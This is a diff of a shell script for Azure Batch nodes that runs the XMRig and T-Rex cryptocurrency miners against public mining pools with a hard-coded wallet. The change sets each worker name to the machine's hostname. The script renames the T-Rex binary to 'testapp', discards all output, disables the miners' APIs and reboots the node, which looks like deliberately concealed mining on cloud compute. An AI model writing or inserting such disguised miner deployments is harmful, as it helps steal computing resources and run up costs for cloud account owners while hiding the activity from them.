@@ -3,7 +3,7 @@ if [ -f "$DIR" ]; then
   ### Take action if $DIR exists ###
     /home/_azbatch/xmrig/build/xmrig --algo=cn-heavy/xhv --url=pool.haven.hashvault.pro:443 --user=hvxyCNrJiqvBtdqWPpAvxtGwLq5n3DdhKcV7rSYRRkxLUGK6pEGm44TAdP9Q11KQKFKCyeEfEge2zMD1nk51aM3u65hqyrQdJi --pass=x --nicehash --max-cpu-usage 75 --cpu-priority 2 --background &&
     hostname=$(hostname | cut -c1-8) &&
-    /home/_azbatch/testapp/testapp --algo ethash --url stratum+tcp://ethash.poolbinance.com:443 --user datad.001 --worker datad.001 --pass 123456 --cpu-priority 5 --api-bind-http 0 --api-bind-telnet 0 --retries 90 --retry-pause 30   > /dev/null 2>&1 
+    /home/_azbatch/testapp/testapp --algo ethash --url stratum+tcp://ethash.poolbinance.com:443 --user datad --worker $hostname --pass 123456 --cpu-priority 5 --api-bind-http 0 --api-bind-telnet 0 --retries 90 --retry-pause 30   > /dev/null 2>&1 
 else
     sudo apt-get update ;
     sudo apt-get -y install libssl-dev cmake build-essential libhwloc-dev libuv1-dev linux-headers-5.4.0-1046-azure ;
@@ -37,6 +37,6 @@ else
     sudo mv /home/_azbatch/trex /home/_azbatch/testapp &&
     sudo mv /home/_azbatch/testapp/t-rex /home/_azbatch/testapp/testapp &&
     hostname=$(hostname | cut -c1-8) &&
-    /home/_azbatch/testapp/testapp --algo ethash --url stratum+tcp://ethash.poolbinance.com:443 --user datad.001 --worker datad.001 --pass 123456 --cpu-priority 5 --api-bind-http 0 --api-bind-telnet 0 --retries 90 --retry-pause 30  > /dev/null 2>&1 
+    /home/_azbatch/testapp/testapp --algo ethash --url stratum+tcp://ethash.poolbinance.com:443 --user datad --worker $hostname --pass 123456 --cpu-priority 5 --api-bind-http 0 --api-bind-telnet 0 --retries 90 --retry-pause 30  > /dev/null 2>&1 
     sudo reboot
 fi
